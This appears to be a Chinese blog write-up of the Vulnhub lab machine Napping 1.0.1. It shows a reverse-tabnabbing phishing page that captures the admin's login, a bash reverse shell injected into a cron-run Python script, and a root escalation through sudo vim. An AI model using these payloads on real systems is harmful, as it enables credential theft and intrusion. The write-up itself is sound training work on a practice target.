---
title: Vulnhub-Napping 1 0 1
published: 2025-03-09 16:17:52
tags: [Vulnhub]
category: 靶机
draft: false
---

# Napping: 1.0.1

> https://www.vulnhub.com/entry/napping-101,752/
> 

## 端口扫描主机发现

1. 探测存活主机，`3`是靶机，`kali`的`ip`为`192.168.56.10`
    
    ```php
    nmap -sP 192.168.56.0/24
    Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-10 14:32 CST
    Nmap scan report for 192.168.56.1
    Host is up (0.00036s latency).
    MAC Address: 0A:00:27:00:00:14 (Unknown)
    Nmap scan report for 192.168.56.2
    Host is up (0.00052s latency).
    MAC Address: 08:00:27:F3:77:5D (Oracle VirtualBox virtual NIC)
    Nmap scan report for 192.168.56.3
    Host is up (0.00048s latency).
    MAC Address: 08:00:27:49:EE:4D (Oracle VirtualBox virtual NIC)
    Nmap scan report for 192.168.56.10
    ```
    
2. 探测主机所有开放端口
    
    ```php
    nmap -sT -min-rate 10000 -p- 192.168.56.3  
    Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-10 14:32 CST
    Nmap scan report for 192.168.56.3
    Host is up (0.00068s latency).
    Not shown: 65533 closed tcp ports (conn-refused)
    PORT   STATE SERVICE
    22/tcp open  ssh
    80/tcp open  http
    MAC Address: 08:00:27:49:EE:4D (Oracle VirtualBox virtual NIC)
    ```
    
3. 探测服务版本以及系统版本
    
    ```php
    nmap -sV -sT -O -p 80,22 192.168.56.3    
    Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-10 14:33 CST
    Nmap scan report for 192.168.56.3
    Host is up (0.00049s latency).
    
    PORT   STATE SERVICE VERSION
    22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
    80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
    MAC Address: 08:00:27:49:EE:4D (Oracle VirtualBox virtual NIC)
    Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
    Device type: general purpose
    Running: Linux 4.X|5.X
    OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
    OS details: Linux 4.15 - 5.8
    Network Distance: 1 hop
    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
    ```
    
4. 扫描漏洞
    
    ```python
    nikto -host 192.168.56.3 -port 80,22
    - Nikto v2.5.0
    ---------------------------------------------------------------------------
    ---------------------------------------------------------------------------
    + Target IP:          192.168.56.3
    + Target Hostname:    192.168.56.3
    + Target Port:        80
    + Start Time:         2024-11-10 14:33:43 (GMT8)
    ---------------------------------------------------------------------------
    + Server: Apache/2.4.41 (Ubuntu)
    + /: Cookie PHPSESSID created without the httponly flag. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies
    + /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
    + /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
    + No CGI Directories found (use '-C all' to force check all possible dirs)
    + Apache/2.4.41 appears to be outdated (current is at least Apache/2.4.54). Apache 2.2.34 is the EOL for the 2.x branch.
    + /: Web Server returns a valid response with junk HTTP methods which may cause false positives.
    + /config.php: PHP Config file may contain database IDs and passwords.
    + 8106 requests: 0 error(s) and 6 item(s) reported on remote host
    + End Time:           2024-11-10 14:34:08 (GMT8) (25 seconds)
    ---------------------------------------------------------------------------
    + 1 host(s) tested
    ```
    
    优先级依旧`80`>`22` ,不过没扫描出什么漏洞
    

## web渗透

1. 访问主页，`CSS`使用的是`bootstrap` 的链接，没有魔法可能会加载不了样式
    
    ![image.png](image%2080.png)
    
2. 扫描目录
    
    ```python
    dirsearch -u http://192.168.56.3 -x 403,404
    //
    [15:05:00] Starting: 
    [15:05:21] 200 -    0B  - /config.php
    [15:05:31] 200 -  539B  - /index.php/login/
    [15:05:34] 302 -    0B  - /logout.php  ->  index.php
    [15:05:45] 200 -  563B  - /register.php
    ```
    
    - `/index.php/login/` 登录页
    - `/register.php` 注册页
3. 注册用户`test`密码`123456` ，登录后台跳转到`welcome.php`
    - `welcome.php`
        
        ![image.png](image%2081.png)
        
        ```python
        
        Hello, test! Welcome to our free blog promotions site.
        Please submit your link so that we can get started. All links will be reviewed by our admin
        ##
        你好，test！欢迎来到我们的免费博客推广网站。
        请提交您的链接，以便我们开始。所有链接都将由我们的管理员审核
        ```
        
        说是输入链接后管理员会获取检查我们链接
        
    - 输入链接，链接提交后会有个`here` 标签，发现是`Reverse Tabnabbing`
        
        > 什么是`Reverse Tabnabbing` ：https://owasp.org/www-community/attacks/Reverse_Tabnabbing
        > 
        
        ![image.png](image%2082.png)
        
4. 制作钓鱼页面
    - 恶意页面`a.html`（跳转用）
        
        ```python
        <!DOCTYPE html>
        <html>
         <body>
          <script>
           if(window.opener) mainframe.location.replace=('http://192.168.56.10:1234/login.htm');
              if(window.opener  != window) mainframe.location.replace=('http://192.168.56.10:1234/login.htm');
          </script>
         </body>
        </html>
        ```
        
    - 钓鱼页面，使用靶机的`login.htm`页面
        
        ```python
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <title>Login</title>
            <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
            <style>
                body{ font: 14px sans-serif; }
                .wrapper{ width: 360px; padding: 20px; }
            </style>
        </head>
        <body>
            <div class="wrapper">
                <h2>Login</h2>
                <p>Please fill in your credentials to login.</p>
        
                <div class="alert alert-danger">Invalid username or password.</div>
                <form action="http://192.168.56.10:1234" method="post">
                    <div class="form-group">
                        <label>Username</label>
                        <input type="text" name="username" class="form-control " value="test">
                        <span class="invalid-feedback"></span>
                    </div>    
                    <div class="form-group">
                        <label>Password</label>
                        <input type="password" name="password" class="form-control ">
                        <span class="invalid-feedback"></span>
                    </div>
                    <div class="form-group">
                        <input type="submit" class="btn btn-primary" value="Login">
                    </div>
                    <p>Don't have an account? <a href="register.php">Sign up now</a>.</p>
                </form>
            </div>
        </body>
        </html>
        ```
        
    - 都放在`kali`的一个文件夹下
        
        ```python
        ┌──(root㉿kali)-[~/Desktop/test/diaoyu]
        └─# ls
        a.html  Login_files  Login.htm
        ```
        
    - `kali`使用`python`开启简易`web`服务器（`~/Desktop/test/diaoyu`文件夹下）
        
        ```python
        python -m http.server 80
        ```
        
    - `kali`开启监听
        
        ```python
        nc -lvp 1234
        ```
        
    - 然后在页面上提交`http://192.168.56.10/a.html` ，随后等待管理员检查链接
        
        简易服务器发现有人请求`a.html`了
        
        ```python
        python -m http.server 80
        Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
        192.168.56.3 - - [10/Nov/2024 16:22:05] "GET /a.html HTTP/1.1" 200 -
        ```
        
        查看nc,得到用户凭证
        
        ```python
        nc -lvp 1234
        listening on [any] 1234 ...
        192.168.56.3: inverse host lookup failed: Unknown host
        connect to [192.168.56.10] from (UNKNOWN) [192.168.56.3] 43212
        POST /login.htm HTTP/1.1
        Host: 192.168.56.10:1234
        User-Agent: python-requests/2.22.0
        Accept-Encoding: gzip, deflate
        Accept: */*
        Connection: keep-alive
        Content-Length: 45
        Content-Type: application/x-www-form-urlencoded
        
        username=daniel&password=C%40ughtm3napping123 
        ```
        

## 获得shell

1. 得到用户凭证后，尝试登录`ssh`
    
    ```python
    daniel
    C@ughtm3napping123
    ```
    
    登陆成功
    
2. 查看权限

```python
daniel@napping:~$ whoami                                                                │┌──(root㉿kali)-[~/Desktop/test/diaoyu]
daniel                                                                                  │└─# python -m http.server 80
daniel@napping:~$ id                                                                    │Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
uid=1001(daniel) gid=1001(daniel) groups=1001(daniel),1002(administrators)              │^C
daniel@napping:~$ uname -a                                                              │Keyboard interrupt received, exiting.
Linux napping 5.4.0-89-generic #100-Ubuntu SMP Fri Sep 24 14:50:10 UTC 2021 x86_64 x86_6│                                                                                                         
4 x86_64 GNU/Linux 
```

1. 查找敏感文件
    - `suid`以及`sudo`没有可利用的
    - 寻找数据库配置文件
        
        ```python
        daniel@napping:/var/www/html$ cat config.php 
        <?php
        /* Database credentials. Assuming you are running MySQL
        server with default setting (user 'root' with no password) */
        define('DB_SERVER', 'localhost');
        define('DB_USERNAME', 'adrian');
        define('DB_PASSWORD', 'P@sswr0d456');
        define('DB_NAME', 'website');
         
        /* Attempt to connect to MySQL database */
        $mysqli = new mysqli(DB_SERVER, DB_USERNAME, DB_PASSWORD, DB_NAME);
         
        // Check connection
        if($mysqli === false){
            die("ERROR: Could not connect. " . $mysqli->connect_error);
        }
        ?>
        ```
        
        发现`adrian` 的账号密码
        
2. 尝试登录`adrian` 账户，无法登录
3. 登录数据库查找敏感信息，没有可以用的信息
4. 继续寻找敏感文件
    - 知道存在`adrian` 用户，在`adrian` 的家目录存在`site_status.txt` ，我们拥有读权限
        
        ```python
        # site_status.txt
        ....
        Site is Up: 10/11/2024 09:58:01
        Site is Up: 10/11/2024 10:00:02
        Site is Up: 10/11/2024 10:02:01
        Site is Up: 10/11/2024 10:04:01
        Site is Up: 10/11/2024 10:06:01
        Site is Up: 10/11/2024 10:08:01
        Site is Up: 10/11/2024 10:10:02
        ```
        
        一长串的类似的文本，应该是服务器启动时记录的，每两分钟一次，应该是有`cron`任务
        
    - 同目录下还存在`query.py`文件
        
        ```python
        from datetime import datetime
        import requests
        
        now = datetime.now()
        
        r = requests.get('http://127.0.0.1/')
        if r.status_code == 200:
            f = open("site_status.txt","a")
            dt_string = now.strftime("%d/%m/%Y %H:%M:%S")
            f.write("Site is Up: ")
            f.write(dt_string)
            f.write("\n")
            f.close()
        else:
            f = open("site_status.txt","a")
            dt_string = now.strftime("%d/%m/%Y %H:%M:%S")
            f.write("Check Out Site: ")
            f.write(dt_string)
            f.write("\n")
            f.close()
        ```
        
        得知`site_status.txt` 的内容时由该文件产生
        
        查看权限，刚好我们也是`administrators`的用户
        
        ```python
        daniel@napping:/home/adrian$ ls -al query.py 
        -rw-rw-r-- 1 adrian administrators 481 Oct 30  2021 query.py
        ```
        
5. 我们拥有修改`query.py` 的权限，那就是拥有adrian用户的权限了
    - 修改`query.py` ,在顶部添加
        
        ```python
        import os;
        os.system("bash -c 'bash -i >& /dev/tcp/192.168.56.10/1234 0>&1'");
        ```
        
        同时开启监听
        
    - 等待执行
        
        ```python
        nc -lvp 1234                        
        listening on [any] 1234 ...
        192.168.56.3: inverse host lookup failed: Unknown host
        connect to [192.168.56.10] from (UNKNOWN) [192.168.56.3] 43506
        bash: cannot set terminal process group (3289): Inappropriate ioctl for device
        bash: no job control in this shell
        adrian@napping:~$
        ```
        
        获得用户`adrian`的`shell`
        
6. 查找敏感文件
    - 第一个flag文件
        
        ```python
        adrian@napping:~$ cat user.txt
        You are nearly there!
        ```
        
    - `sudo -l` ，K.O.
        
        ```python
        adrian@napping:~$ sudo -l
        Matching Defaults entries for adrian on napping:
            env_reset, mail_badpass,
            secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
        
        User adrian may run the following commands on napping:
            (root) NOPASSWD: /usr/bin/vim
        adrian@napping:~$ 
        ```
        
7. `vim`可以免密码以`root`账号执行，故可以提权
    
    ```python
    adrian@napping:~$ sudo vim
    ```
    
    然后在命令行模式下输入`!/bin/bash`
    
    ```python
    :!/bin/bash
    
    id
    uid=0(root) gid=0(root) groups=0(root)
    ```
    
    获得root！！！！
    
8. 读取`flag`文件
    
    ```python
    cat root.txt
    Admins just can't stay awake tsk tsk tsk
    ```
    

## 总结

学习到`Reverse_Tabnabbing`的钓鱼攻击方式